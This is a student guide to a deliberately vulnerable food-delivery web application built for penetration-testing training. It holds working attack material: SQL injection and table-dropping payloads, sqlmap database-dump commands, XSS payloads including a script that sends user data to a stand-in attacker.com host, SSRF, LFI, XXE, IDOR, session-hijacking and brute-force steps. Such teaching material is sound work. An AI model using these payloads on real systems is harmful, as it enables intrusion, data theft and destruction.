# Manchester Fresh Foods - Student Testing Guide

## Quick Start for Students

This is a deliberately vulnerable B2B food delivery application created for **penetration testing education**. Your goal is to discover and document security vulnerabilities.

### ⚠️ Important
- This application is **ONLY for educational use** in controlled environments
- Never use these techniques on real systems without authorisation
- Document all findings professionally as you would in a real penetration test

---

## Getting Started

### Demo Accounts

Use these credentials to explore the application:

**Customer Account** (Recommended for initial exploration):
- **Username**: `thepubco`
- **Password**: `welcome123`
- **Company**: The Pub Company Ltd
- Access to: Dashboard, orders, profile, invoices

**Admin Account**:
- **Username**: `admin`
- **Password**: `admin123`
- Full administrative access

**Other Customer Accounts** (for IDOR testing):
- `bella_italia` / `pasta2024` - Bella Italia Restaurant
- `green_leaf` / `healthy1` - Green Leaf Café
- `royal_curry` / `spice99` - Royal Curry House
- `cityhotel` / `hotel2024` - Manchester City Hotel

---

## Example Vulnerability: Viewing Other Users' Orders (IDOR)

### What is IDOR?
Insecure Direct Object Reference (IDOR) occurs when an application exposes direct references to internal objects (like database IDs) without proper authorisation checks.

### How to Test This Vulnerability

#### Step 1: Login as First Customer and Capture Order IDs
1. Open **Firefox** and press **F12** to open Firefox Developer Tools
2. Go to the **Network** tab
3. Navigate to `/login` and login as **thepubco** / **welcome123**
4. Click "My Orders" in the sidebar

#### Step 2: Extract Order IDs from API Response
1. In the Network tab, find the request to `/api/orders`
2. Click on it and select the **Response** tab
3. You'll see JSON containing your 3 orders with their UUIDs:
```json
[
  {"id": "abc123-def456-...", "orderNumber": "MFF-1000", ...},
  {"id": "xyz789-uvw012-...", "orderNumber": "MFF-1001", ...},
  {"id": "pqr345-stu678-...", "orderNumber": "MFF-1002", ...}
]
```
4. **Copy one of the order IDs** (the UUID, not the order number)

#### Step 3: Logout and Login as Different Customer
1. Click **Logout** in the sidebar
2. Login as **bella_italia** / **pasta2024**
3. Navigate to "My Orders" - you'll see different orders (MFF-1003, MFF-1004, etc.)

#### Step 4: Access First Customer's Order (The IDOR Attack!)

**Method A: Using Firefox Developer Tools Console**
1. Press **F12** to open Firefox Developer Tools
2. Go to the **Console** tab
3. Run this JavaScript (paste thepubco's order UUID):
```javascript
fetch('/api/orders/PASTE_THEPUBCO_ORDER_UUID_HERE')
  .then(r => r.json())
  .then(data => console.log('STOLEN ORDER:', data))
```
4. You'll see thepubco's order details even though you're logged in as bella_italia!

**Method B: Using Burp Suite**
1. Configure Firefox to use Burp as proxy (127.0.0.1:8080)
2. In Burp, go to Proxy > Intercept
3. In Firefox, refresh the My Orders page
4. Intercept the request to `/api/orders`
5. Send to Repeater (Ctrl+R)
6. Change the URL to `/api/orders/THEPUBCO_ORDER_UUID`
7. Click Send - observe unauthorised access to another customer's order!

**Method C: Using curl**
```bash
# Get your session cookie from Firefox Developer Tools > Storage > Cookies
curl -H "Cookie: connect.sid=your-session-cookie" \
  http://<TARGETIP>:5000/api/orders/THEPUBCO_ORDER_UUID
```

### Expected Result
✅ **Successful Exploit**: You can view orders belonging to other customers, including:
- Order details (items, quantities, prices)
- Delivery addresses
- Order notes (may contain sensitive information)
- Customer company names

### Why This is Dangerous
- **Privacy breach**: Competitors can see what other businesses are ordering
- **Business intelligence**: Order patterns reveal business strategy
- **Data protection violation**: GDPR breach exposing customer information

### Remediation
The endpoint should verify ownership:
```typescript
// SECURE VERSION
app.get("/api/orders/:id", async (req, res) => {
  const order = await storage.getOrder(req.params.id);
  if (!order) {
    return res.status(404).json({ error: "Order not found" });
  }
  
  // ✅ CHECK OWNERSHIP
  if (order.userId !== req.session.userId) {
    return res.status(403).json({ error: "Unauthorised" });
  }
  
  res.json(order);
});
```

---

## Example Vulnerability: SQL Injection Authentication Bypass

### What is SQL Injection?
SQL Injection occurs when untrusted user input is inserted into SQL queries without proper sanitisation, allowing attackers to manipulate database queries.

**⚠️ IMPORTANT**: This application now uses a **real SQLite database** with genuinely vulnerable SQL queries (not simulated). All SQL injection testing tools like SQLmap will work authentically!

### How to Test This Vulnerability

#### Method 1: Manual Testing (Easiest)

**Step 1: Navigate to Login Page**
1. Open **Firefox** and go to `/login`
2. Press **F12** to open Firefox Developer Tools > Console tab to observe any errors

**Step 2: Try Authentication Bypass Payload**
In the **username** field, enter:
```
' OR '1'='1' --
```
In the **password** field, enter anything (e.g., `anything`)

Click **Login**

**Expected Result:**
✅ **Successful Exploit**: You'll be logged in as the first user in the database (usually `admin`), completely bypassing password authentication!

**Why This Works:**
The vulnerable SQL query looks like:
```sql
SELECT * FROM users WHERE username='' OR '1'='1' --' AND password='anything'
```

Breaking it down:
- `username=''` - Checks if username is empty (false)
- `OR '1'='1'` - This is always true!
- `--` - SQL comment, ignores the password check entirely

**Other Payloads to Try:**
```sql
admin'--
' OR 1=1--
' OR 'a'='a'--
admin' OR '1'='1
```

**Alternative: Using curl**
You can also verify the vulnerability using `curl` from the terminal:
```bash
curl -X POST http://<TARGETIP>:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "'\'' OR '\''1'\''='\''1'\'' --", "password": "anything"}'
```

#### Method 2: Using SQLmap (Advanced)

SQLmap is a powerful automated SQL injection tool that can extract entire databases.

**Recommended Approach: Product Search Endpoint**

The product search endpoint is the simplest to test because it doesn't require authentication:

```bash
# Step 1: Detect the SQL injection vulnerability
sqlmap -u "http://<TARGETIP>:5000/api/products?search=tomato" \
  --batch --level=5 --risk=3 \
  --dbms=SQLite

# Step 2: List all tables in the database
sqlmap -u "http://<TARGETIP>:5000/api/products?search=tomato" \
  --tables --batch --dbms=SQLite

# Step 3: Dump all data from the database
sqlmap -u "http://<TARGETIP>:5000/api/products?search=tomato" \
  --dump-all --batch --dbms=SQLite --exclude-sysdbs
```

**What you'll extract:**
- Usernames and plaintext passwords
- Email addresses
- Company information
- User roles (admin, customer)
- All products, orders, and contact submissions

**Alternative: Login Endpoint (More Complex)**

The login endpoint is also vulnerable, but harder to test with SQLmap because the SQL injection happens during authentication itself. SQLmap may struggle because injected payloads break the login, causing 401 errors:

```bash
# Test login endpoint (may require manual testing instead)
sqlmap -u "http://<TARGETIP>:5000/api/login" \
  --data='{"username":"admin","password":"admin123"}' \
  --headers="Content-Type: application/json" \
  --batch --level=5 --risk=3
```

**Note**: For the login endpoint, manual SQL injection testing (Method 1 above) is more reliable than SQLmap.

**Step 4: Analyse Results**

After running the three commands above, SQLmap will:
- ✅ **Step 1**: Detect SQL injection vulnerability (UNION query injection)
- ✅ **Step 2**: List all tables (users, products, orders, order_items, reviews, contact_submissions)
- ✅ **Step 3**: Dump all data including usernames and **plaintext passwords**!

**Expected Output from Step 1 (Detection):**
```
[INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[INFO] GET parameter 'search' is vulnerable
[INFO] the back-end DBMS is SQLite
```

**Expected Output from Step 2 (List Tables):**
```
Database: SQLite_masterdb
[6 tables]
+---------------------+
| contact_submissions |
| order_items         |
| orders              |
| products            |
| reviews             |
| users               |
+---------------------+
```

**Expected Output from Step 3 (Dump All):**
```
[INFO] fetching entries for table 'users'
Database: SQLite_masterdb
Table: users
[7 entries]
+------+----------+----------+-------+
| id   | username | password | role  |
+------+----------+----------+-------+
| ...  | admin    | admin123 | admin |
| ...  | thepubco | welcome123| customer |
...
```

**Note**: SQLmap saves all extracted data to `/root/.sqlmap/output/<TARGETIP>/` as CSV and text files.

### Product Search is Also Vulnerable!

The product search functionality is equally vulnerable:

**Step 1: Go to Products Page**
Visit `/products` (no login required!)

**Step 2: Try SQL Injection in Search**
Enter in the search box:
```
' OR '1'='1' --
```

**Expected Result:**
All products are returned, bypassing search filtering!

**More Sophisticated Payload (Extracting User Data):**
```sql
' UNION SELECT id, username as name, email as description, 'user' as category, 'N/A' as unit, 0 as price_per_unit, '' as image_url, 0 as stock FROM users --
```

**Expected Result:**
User accounts (including admin!) appear in the product list.

### Why This is Extremely Dangerous

**Real-World Impact:**
- **Complete database compromise**: Attackers can read, modify, or delete all data
- **Authentication bypass**: Access any account without passwords
- **Data exfiltration**: Customer data, orders, financial information exposed
- **Compliance violations**: GDPR, PCI-DSS breaches
- **Reputational damage**: Customer trust destroyed
- **Financial losses**: Fines, lawsuits, business disruption

**OWASP Top 10**: A03:2021 - Injection  
**CVSS Score**: 9.8 (Critical)

### Remediation: Use Parameterized Queries

**VULNERABLE CODE (Current):**
```typescript
// ❌ DANGEROUS: String concatenation
const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
const user = db.prepare(query).get();
```

**SECURE CODE (Recommended Fix):**
```typescript
// ✅ SAFE: Parameterized queries
const query = `SELECT * FROM users WHERE username=? AND password=?`;
const user = db.prepare(query).get(username, password);
```

**Additional Security Layers:**
1. **Input validation**: Whitelist allowed characters
2. **Least privilege**: Database user shouldn't have DROP/DELETE permissions
3. **WAF (Web Application Firewall)**: Detect and block SQL injection attempts
4. **Hashed passwords**: Use bcrypt (plaintext passwords are another vulnerability!)
5. **Prepared statements**: Always use parameterized queries


## All 15 Vulnerabilities to Discover

This application contains 15 intentional security vulnerabilities organised by severity. Use this as a checklist for your penetration test.

### 🔴 CRITICAL Severity

#### 1. Plaintext Password Storage
**Location**: User authentication system  
**Test**: Register a new account, then check error messages or database inspection  
**What to look for**: Passwords stored without hashing (bcrypt, scrypt, etc.)  
**Impact**: If database is compromised, all user passwords are immediately exposed  
**OWASP**: A02:2021 - Cryptographic Failures

#### 2. Default/Hardcoded Credentials
**Location**: Pre-populated user accounts  
**Test**: Try common default credentials like `admin/admin123`  
**Impact**: Immediate administrative access without brute force  
**OWASP**: A07:2021 - Identification and Authentication Failures

---

### 🟠 HIGH Severity

#### 3. SQL Injection
**Location**: Login form, product search  
**Test**: Username field with `' OR '1'='1' --` (any password)  
**Alternative payloads**: 
- `admin'--`
- `' OR 1=1--`
- `'; DROP TABLE users--`
**Impact**: Complete authentication bypass, database manipulation, data extraction  
**Tools**: SQLmap, Burp Suite Intruder  
**OWASP**: A03:2021 - Injection

#### 4. Stored Cross-Site Scripting (XSS)
**Locations**: Profile bio, order notes
**Test payloads**:
- `<img src=x onerror=alert('XSS')>` (Recommended for React apps)
- `<img src=x onerror=alert(document.cookie)>`
- Note: `<script>` tags may not execute due to browser protections against `innerHTML` insertion.
**Impact**: Session hijacking, credential theft, defacement  
**OWASP**: A03:2021 - Injection

#### 5. Insecure Direct Object Reference (IDOR)
**Locations**: `/api/orders/:id`, `/api/profile/:userId`  
**Test**: Login as one customer, capture order ID, login as different customer, access first customer's order ID  
**Tools**: Burp Suite Repeater, Firefox Developer Tools  
**Impact**: Unauthorised access to other users' sensitive data  
**OWASP**: A01:2021 - Broken Access Control

#### 6. Exposed Secrets in Client Code
**Location**: JavaScript source code, environment variables  
**Test**: View page source, check DevTools Sources tab, inspect bundle.js  
**What to look for**: API keys, session secrets, internal endpoints  
**Impact**: Credential compromise, API abuse  
**OWASP**: A05:2021 - Security Misconfiguration

#### 7. Predictable Session Tokens
**Location**: Session cookies  
**Test**: 
1. Login and note session cookie value
2. Logout and login again
3. Compare cookie values - look for patterns
**Pattern**: `sess_{counter}_{timestamp}`  
**Impact**: Session enumeration and hijacking  
**Tools**: Burp Suite Sequencer  
**OWASP**: A07:2021 - Identification and Authentication Failures

#### 8. Server-Side Request Forgery (SSRF)
**Location**: `POST /api/fetch-document`  
**Test payload**: `{"url": "http://<TARGETIP>:5000/api/config"}`  
**Alternative targets**:
- `http://169.254.169.254/latest/meta-data/` (AWS metadata)
- `http://<TARGETIP>:5000/data/customers.txt`
- Internal network IPs
**Impact**: Access to internal resources, credential exposure, port scanning  
**OWASP**: A10:2021 - Server-Side Request Forgery

#### 9. Local File Inclusion (LFI)
**Location**: `GET /api/view-document?file=...`  
**Test payloads**:
- `file=../../../../etc/passwd`
- `file=../../server/routes.ts`
- `file=../../../package.json`
**Impact**: Source code disclosure, configuration file access, credential theft  
**OWASP**: A01:2021 - Broken Access Control

---

### 🟡 MEDIUM Severity

#### 10. Weak Password Policy
**Location**: Registration form  
**Test**: Try registering with password `a` or `123`  
**What to check**:
- Minimum length (should be 12+ characters)
- Complexity requirements
- Common password blocking
**Impact**: Easy credential guessing, successful brute force attacks  
**OWASP**: A07:2021 - Identification and Authentication Failures

#### 11. Missing CSRF Protection
**Locations**: All state-changing endpoints (POST, PUT, DELETE)  
**Test**: Create HTML form on external site that submits to `/api/orders`  
**What to check**: No CSRF tokens, no SameSite cookie attributes  
**Impact**: Unauthorised actions on behalf of authenticated users  
**OWASP**: A01:2021 - Broken Access Control

#### 12. Verbose Error Messages
**Location**: All error responses  
**Test**: Trigger errors by sending invalid data, malformed requests  
**What to look for**:
- Stack traces with file paths
- SQL error messages revealing database structure
- Internal server details
**Impact**: Information disclosure aids further attacks  
**OWASP**: A05:2021 - Security Misconfiguration

#### 13. No Rate Limiting
**Locations**: Login, registration, all endpoints  
**Test**: Script 100+ rapid login attempts  
**Tools**: Burp Suite Intruder, custom Python script  
**Impact**: Brute force attacks, credential stuffing, DoS  
**OWASP**: A07:2021 - Identification and Authentication Failures

#### 14. XML External Entity (XXE) Injection
**Location**: `POST /api/import-order`  
**Test payload**:
```xml
<?xml version="1.0"?>
<!DOCTYPE order [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<order>
  <customer>&xxe;</customer>
</order>
```
**Impact**: File disclosure, SSRF, denial of service  
**OWASP**: A05:2021 - Security Misconfiguration

#### 15. Information Disclosure
**Locations**: Various endpoints and files  
**Test**:
- Navigate to `/.git/HEAD` (source code exposure)
- Check `/robots.txt` for hidden paths
- Access `/api/config` (configuration disclosure)
- Try `/data/customers.txt` (PII leak)
**Impact**: Reconnaissance data for further attacks  
**OWASP**: A05:2021 - Security Misconfiguration

---

## Penetration Testing Tools & Setup

### Essential Tools for This Application

This section provides detailed setup and usage instructions for the most effective tools to test Manchester Fresh Foods.

### 1. Burp Suite Community Edition

**Purpose**: HTTP request interception, manipulation, and repeating  
**Best for**: IDOR testing, session analysis, CSRF testing, manual SQL injection

**Setup for Firefox:**
1. Download from [portswigger.net/burp/communitydownload](https://portswigger.net/burp/communitydownload)
2. **Configure Firefox proxy:**
   - Open Firefox Settings (about:preferences)
   - Scroll to Network Settings → Click "Settings..."
   - Select "Manual proxy configuration"
   - HTTP Proxy: `127.0.0.1` Port: `8080`
   - Check "Also use this proxy for HTTPS"
   - Click OK
3. **Import Burp's CA certificate in Firefox:**
   - In Burp, go to Proxy → Options → Import/Export CA Certificate
   - Export Certificate in DER format
   - In Firefox: Settings → Privacy & Security → Certificates → View Certificates
   - Import → Select the certificate → Check "Trust this CA to identify websites"

**Testing Manchester Fresh Foods:**

**Example 1: IDOR Testing**
```
1. Proxy → Intercept: ON
2. Login as thepubco and navigate to My Orders
3. Observe the GET /api/orders request in Burp's HTTP History
4. Note the order UUIDs in the JSON response
5. Right-click request → Send to Repeater
6. Logout, login as bella_italia
7. In Repeater, change URL to /api/orders/THEPUBCO_ORDER_UUID
8. Click Send - observe unauthorised access to another user's order!
```

**Example 2: SQL Injection Testing**
```
1. Intercept login POST to /api/login
2. Send to Intruder
3. Set payload position: username=§admin§
4. Load SQL injection payloads from Burp's built-in list
5. Start attack and observe responses
6. Look for authentication bypass (200 status with session cookie)
```

**Example 3: Session Token Analysis**
```
1. Login/logout multiple times
2. Send all login responses to Sequencer
3. Analyze token randomness
4. Observe predictable pattern: sess_1000_timestamp, sess_1001_timestamp, etc.
```

---

### 2. OWASP ZAP (Zed Attack Proxy)

**Purpose**: Automated scanning and passive vulnerability detection  
**Best for**: Quick reconnaissance, finding common vulnerabilities, generating reports  
**Free alternative to Burp Suite Professional**

**Installation:**
```bash
# Ubuntu/Debian
sudo apt install zaproxy

# macOS
brew install --cask owasp-zap

# Windows: Download from https://www.zaproxy.org/download/
```

**Automated Scan Against Manchester Fresh Foods:**

**Quick Scan (5 minutes):**
```
1. Open ZAP
2. Automated Scan → Enter: http://<TARGETIP>:5000
3. Attack → Select all scan policies
4. Start Scan
5. Review Alerts tab after completion
```

**Manual Explore + Active Scan (Recommended):**
```
1. HUD Mode: Install ZAP's Firefox extension (HUD)
2. Configure Firefox to use ZAP as proxy (127.0.0.1:8080)
3. Manually browse the application while logged in
4. ZAP will automatically discover all endpoints
4. Right-click site → Attack → Active Scan
5. Export report: Report → Generate HTML Report
```

**Testing Specific Endpoints:**
```bash
# Using ZAP CLI (after installation)

# Scan login endpoint for SQL injection
zap-cli quick-scan --self-contained \
  --spider -r \
  --ajax-spider \
  http://<TARGETIP>:5000/login

# Scan product search
zap-cli quick-scan \
  http://<TARGETIP>:5000/products
```

**Expected Findings:**
- ✅ SQL Injection in login form
- ✅ Missing CSRF tokens
- ✅ Weak session cookies
- ✅ XSS in profile bio
- ✅ Verbose error messages

---

### 3. SQLmap - Automated SQL Injection

**Purpose**: Database extraction through SQL injection  
**Best for**: Extracting complete database, testing blind SQL injection

**Installation:**
```bash
# Linux/macOS
git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git
cd sqlmap

# Or use package manager
sudo apt install sqlmap  # Ubuntu/Debian
brew install sqlmap      # macOS
```

**Manchester Fresh Foods Specific Commands:**

**Test 1: Login Form SQL Injection (Two Methods)**

**Method A: Using Burp Suite Request File** (most reliable)
```bash
# 1. In Burp Suite, right-click the POST /api/login request
# 2. Select "Copy to file" and save as login-request.txt
# 3. Run SQLmap against the saved request:

# Detect SQL injection
sqlmap -r login-request.txt --batch --dbms=SQLite

# Extract database names
sqlmap -r login-request.txt --dbs --dbms=SQLite

# List all tables
sqlmap -r login-request.txt --tables --dbms=SQLite

# Dump users table (plaintext passwords!)
sqlmap -r login-request.txt -T users --dump --dbms=SQLite

# Dump ALL data (orders, products, customers)
sqlmap -r login-request.txt --dump-all --dbms=SQLite --exclude-sysdbs
```

**Method B: Direct URL with JSON** (if Burp unavailable)
```bash
# For API endpoints that expect JSON:
sqlmap -u "http://<TARGETIP>:5000/api/login" \
  --data='{"username":"admin","password":"test"}' \
  --headers="Content-Type: application/json" \
  --batch --dbms=SQLite

# If SQLmap needs help finding the parameter, add a marker:
sqlmap -u "http://<TARGETIP>:5000/api/login" \
  --data='{"username":"admin*","password":"test"}' \
  --headers="Content-Type: application/json" \
  --dbms=SQLite
```

**Test 2: Product Search SQL Injection**
```bash
# Test product search endpoint
sqlmap -u "http://<TARGETIP>:5000/api/products/search?query=tomato" \
  --batch --dbms=SQLite \
  --level=5 --risk=3

# Extract product table
sqlmap -u "http://<TARGETIP>:5000/api/products/search?query=tomato" \
  --dbms=SQLite -T products --dump
```

**Test 3: Order IDOR + SQL Injection**
```bash
# First, get a valid session cookie by logging in
# Copy connect.sid value from Firefox Developer Tools (Storage > Cookies)

sqlmap -u "http://<TARGETIP>:5000/api/orders/ORDER_UUID_HERE" \
  --cookie="connect.sid=YOUR_SESSION_COOKIE" \
  --dbms=SQLite \
  --dump -T orders
```

**SQLmap Output Interpretation:**
```
[INFO] testing 'SQLite inline queries'
✅ VULNERABLE! Parameter 'username' is vulnerable

[INFO] fetching database names
[INFO] fetching tables for database: 'main'
Database: SQLite_masterdb
[6 tables]
+---------------------+
| contact_submissions |
| order_items         |
| orders              |
| products            |
| reviews             |
| users               |
+---------------------+

Database: SQLite_masterdb
Table: users
[7 entries]
+----------+------------+-----------+---------+
| username | password   | role      | company |
+----------+------------+-----------+---------+
| admin    | admin123   | admin     | NULL    |
| thepubco | welcome123 | customer  | The Pub Company Ltd |
...
```

---

### 4. Nikto - Web Server Scanner

**Purpose**: Reconnaissance and configuration testing  
**Best for**: Finding hidden files, information disclosure, server misconfigurations

**Installation:**
```bash
sudo apt install nikto     # Ubuntu/Debian
brew install nikto         # macOS
```

**Scan Manchester Fresh Foods:**
```bash
# Basic scan
nikto -h http://<TARGETIP>:5000

# Comprehensive scan with all plugins
nikto -h http://<TARGETIP>:5000 -Tuning x

# Save results
nikto -h http://<TARGETIP>:5000 -o nikto-report.html -Format html
```

**Expected Findings:**
- ✅ Missing security headers (X-Frame-Options, CSP)
- ✅ Potential directory listings
- ✅ Information disclosure in error pages
- ✅ Session cookie without Secure/HttpOnly flags

---

### 5. Firefox Extensions for Penetration Testing

**Cookie Editor (Firefox)**
- **Purpose**: Manipulate session cookies for hijacking tests
- **Install**: [Firefox Add-ons - Cookie Editor](https://addons.mozilla.org/en-GB/firefox/addon/cookie-editor/)
- **Use case**: Change session ID to hijack another user's session

**Example - Session Hijacking:**
```
1. Login as thepubco in Firefox
2. Click the Cookie Editor icon in toolbar
3. Find cookie: connect.sid=sess_1000_1699876543
4. Edit the value, increment counter: sess_1001_1699876543
5. Click Save, then refresh page
6. Result: You've hijacked bella_italia's session!
```

**Cookie Quick Manager (Firefox)**
- **Install**: [Firefox Add-ons - Cookie Quick Manager](https://addons.mozilla.org/en-GB/firefox/addon/cookie-quick-manager/)
- Similar functionality with export/import for session replay
- View all cookies in a searchable interface

**Wappalyzer (Firefox)**
- **Install**: [Firefox Add-ons - Wappalyzer](https://addons.mozilla.org/en-GB/firefox/addon/wappalyzer/)
- **Purpose**: Technology detection
- **Expected results for MFF**: React, Express.js, Tailwind CSS, Node.js

**FoxyProxy Standard (Firefox)**
- **Install**: [Firefox Add-ons - FoxyProxy](https://addons.mozilla.org/en-GB/firefox/addon/foxyproxy-standard/)
- **Purpose**: Quick proxy switching for Burp Suite/ZAP
- **Setup**: 
  1. Click FoxyProxy icon → Options
  2. Add new proxy: Title "Burp", Host "127.0.0.1", Port "8080"
  3. Click FoxyProxy icon → Select "Burp" to enable proxy
  4. Select "Disable FoxyProxy" to browse normally

---

### 6. curl - Command-Line Testing

**Purpose**: Quick API endpoint testing, scripting attacks  
**Best for**: Automation, IDOR testing, bypass testing

**Manchester Fresh Foods Examples:**

**Test 1: SQL Injection in Login**
```bash
# Authentication bypass
curl -X POST http://<TARGETIP>:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"'"'"' OR '"'"'1'"'"'='"'"'1'"'"' --","password":"anything"}' \
  -c cookies.txt \
  -v

# Check if logged in
curl http://<TARGETIP>:5000/api/user \
  -b cookies.txt
```

**Test 2: IDOR - Access Other User's Orders**
```bash
# Login as thepubco
curl -X POST http://<TARGETIP>:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"thepubco","password":"welcome123"}' \
  -c thepubco-cookies.txt

# Get thepubco's orders
curl http://<TARGETIP>:5000/api/orders \
  -b thepubco-cookies.txt \
  | jq '.[] | .id'  # Note the order UUIDs

# Login as bella_italia
curl -X POST http://<TARGETIP>:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"bella_italia","password":"pasta2024"}' \
  -c bella-cookies.txt

# Access thepubco's order using bella's session!
curl http://<TARGETIP>:5000/api/orders/THEPUBCO_ORDER_UUID \
  -b bella-cookies.txt
```

**Test 3: XSS Payload Injection**
```bash
# Inject XSS into profile bio
curl -X POST http://<TARGETIP>:5000/api/profile \
  -H "Content-Type: application/json" \
  -b cookies.txt \
  -d '{"bio":"<script>alert(document.cookie)</script>","phone":"123-456-7890"}'
```

**Test 4: Rate Limiting Test**
```bash
# Attempt 100 login requests (no rate limiting!)
for i in {1..100}; do
  curl -X POST http://<TARGETIP>:5000/api/login \
    -H "Content-Type: application/json" \
    -d '{"username":"admin","password":"test'$i'"}' \
    -s -o /dev/null -w "%{http_code}\n"
done
```

---

### 7. Firefox Developer Tools (Built-in)

**How to Open**: Press **F12** or right-click → "Inspect"

**Purpose**: Client-side testing, JavaScript analysis, network inspection  
**Best for**: XSS testing, session analysis, exposed secrets

**Firefox DevTools Tabs:**
- **Inspector**: View and edit HTML/CSS (like Chrome's Elements)
- **Console**: Execute JavaScript, view errors and logs
- **Debugger**: View JavaScript source files (like Chrome's Sources)
- **Network**: Monitor HTTP requests and responses
- **Storage**: View cookies, localStorage, sessionStorage (like Chrome's Application)

**Manchester Fresh Foods Examples:**

**Test 1: Stored XSS**
```
1. Navigate to /dashboard/profile in Firefox
2. Press F12 to open Developer Tools
3. In the bio field, enter this payload:
   <img src=x onerror=alert('XSS')>
4. Save the profile
5. Refresh the page - observe the XSS alert!

More dangerous payload (credential theft):
<script>
  fetch('/api/user').then(r=>r.json()).then(u=>
    fetch('https://attacker.com/steal?data='+JSON.stringify(u))
  )
</script>
```

**Test 2: Session Cookie Analysis**
```
1. Press F12 to open Firefox Developer Tools
2. Go to the Storage tab
3. Expand Cookies → http://<TARGETIP>:5000
4. Find the connect.sid cookie
5. Check for security issues:
   ❌ Missing HttpOnly flag (allows JavaScript access)
   ❌ Missing Secure flag (sent over HTTP)
   ❌ Missing SameSite attribute (CSRF vulnerable)
   ❌ Predictable session ID pattern (sess_1000_timestamp)

Alternative - Console tab:
document.cookie  // If HttpOnly is missing, cookie is visible here!
```

**Test 3: Exposed Secrets in Source Code**
```
1. Press F12 to open Firefox Developer Tools
2. Go to the Debugger tab
3. Press Ctrl+Shift+F to open "Search in all files"
4. Search for sensitive keywords:
   - "api_key"
   - "secret"
   - "password"
   - "token"
   - "SESSION_SECRET"
5. Check for exposed credentials in JavaScript bundles
```

**Test 4: IDOR via Console**
```javascript
// Press F12, go to Console tab
// Paste and run these commands:

// Get another user's order (replace UUID with one captured earlier)
fetch('/api/orders/UUID_FROM_OTHER_USER')
  .then(r => r.json())
  .then(data => console.log('STOLEN ORDER:', data))

// Get another user's profile  
fetch('/api/profile/DIFFERENT_USER_ID')
  .then(r => r.json())
  .then(data => console.log('STOLEN PROFILE:', data))
```

**Test 5: Network Tab Analysis**
```
1. Press F12, go to Network tab
2. Navigate around the application
3. Look for:
   - API endpoints being called (filter by XHR)
   - Sensitive data in responses
   - Session tokens in headers
   - Unencrypted data transmission
4. Right-click any request → "Edit and Resend" to modify and replay
```

---

### 8. Postman / Insomnia - API Testing

**Purpose**: Structured API testing, collection building  
**Best for**: Testing authenticated endpoints, building attack workflows

**Manchester Fresh Foods Collection:**

Create a Postman collection with these requests:

```
1. Login (POST /api/login)
   - Save session cookie automatically
   
2. Get Current User (GET /api/user)
   - Uses saved session
   
3. Get Orders (GET /api/orders)
   - Test IDOR by manually changing order IDs
   
4. Search Products (GET /api/products/search?query=')
   - SQL injection payloads in query parameter
   
5. Update Profile (POST /api/profile)
   - XSS payloads in bio field
```

---

## Tool Recommendation Matrix

Match each vulnerability to the best testing tool:

| Vulnerability | Primary Tool | Alternative Tools |
|--------------|--------------|-------------------|
| **SQL Injection** | SQLmap, Burp Intruder | curl, ZAP, Manual (DevTools) |
| **Stored XSS** | Firefox Developer Tools, Burp | ZAP, Manual testing |
| **IDOR** | Burp Repeater, curl | Postman, DevTools Console |
| **Weak Passwords** | Burp Intruder, Hydra | Custom Python script |
| **Session Hijacking** | Cookie Editor, Burp | EditThisCookie, curl |
| **CSRF** | Burp, Custom HTML form | curl, Postman |
| **Rate Limiting** | Burp Intruder | curl loop, Python script |
| **SSRF** | curl, Burp Repeater | Postman |
| **LFI** | curl, Browser | Burp Repeater |
| **XXE** | Burp Repeater, curl | Postman |
| **Info Disclosure** | Nikto, curl | Browser, ZAP Spider |
| **Plaintext Passwords** | SQLmap (dump users) | Burp (observe responses) |
| **Predictable Sessions** | Burp Sequencer | Cookie Editor + manual |
| **Verbose Errors** | ZAP, Nikto | Any tool (trigger errors) |
| **Exposed Secrets** | Firefox Developer Tools Debugger | grep source files |

---

## Complete Penetration Testing Workflow

Follow this methodology to systematically test Manchester Fresh Foods:

### Phase 1: Reconnaissance (30 minutes)

**Goal**: Map the application and identify attack surface

```bash
# 1. Technology detection
# Open application in browser with Wappalyzer enabled

# 2. Spider the application
nikto -h http://<TARGETIP>:5000

# 3. Manual exploration
# - Browse all public pages (/, /products, /contact, /login, /register)
# - Login and explore authenticated pages
# - Note all forms, inputs, and API endpoints

# 4. Intercept traffic with Burp/ZAP
# - Enable proxy
# - Click through entire application
# - Review Site Map in Burp to see all endpoints discovered
```

**Expected Endpoints Discovered:**
```
Public:
- GET  /
- GET  /products
- GET  /contact
- GET  /login
- GET  /register
- GET  /instructor
- GET  /api/products
- GET  /api/products/search?query=
- POST /api/login
- POST /api/register
- POST /api/contact

Authenticated (Customer):
- GET  /dashboard
- GET  /dashboard/orders
- GET  /dashboard/place-order
- GET  /dashboard/invoices
- GET  /dashboard/profile
- GET  /api/user
- GET  /api/orders
- GET  /api/orders/:id
- POST /api/orders
- POST /api/profile

Admin:
- All customer endpoints plus full order visibility
```

---

### Phase 2: Automated Scanning (45 minutes)

**Goal**: Let tools find low-hanging fruit

```bash
# 1. ZAP Automated Scan
# Run full automated scan while you work on manual tests

# 2. SQLmap against login
sqlmap -r login-request.txt --batch --dbms=SQLite --dump-all

# 3. Nikto full scan
nikto -h http://<TARGETIP>:5000 -Tuning x -o nikto-report.html -Format html
```

**Review automated findings and prioritize manual verification**

---

### Phase 3: Manual Exploitation (2-3 hours)

**Test each vulnerability systematically:**

**1. Authentication (30 min)**
- [ ] SQL injection in login (`' OR '1'='1' --`)
- [ ] Default credentials (`admin/admin123`)
- [ ] Weak password policy (register with `a`)
- [ ] Session predictability (login/logout 5x, analyze pattern)

**2. Authorization (30 min)**
- [ ] IDOR in orders (access other customer orders)
- [ ] IDOR in profiles (view/edit other user profiles)
- [ ] Admin functions accessible to customers

**3. Injection Attacks (45 min)**
- [ ] SQL injection in product search
- [ ] Stored XSS in profile bio
- [ ] Stored XSS in order notes
- [ ] Stored XSS in contact form
- [ ] XXE in order import (if implemented)

**4. Information Disclosure (20 min)**
- [ ] Verbose error messages (trigger errors)
- [ ] Exposed secrets in JS source
- [ ] Directory traversal attempts
- [ ] Database credential exposure

**5. Session Management (20 min)**
- [ ] Cookie analysis (missing flags)
- [ ] Session fixation
- [ ] Session hijacking via predictable IDs

**6. Security Controls (20 min)**
- [ ] CSRF (create external form)
- [ ] Rate limiting (100 login attempts)
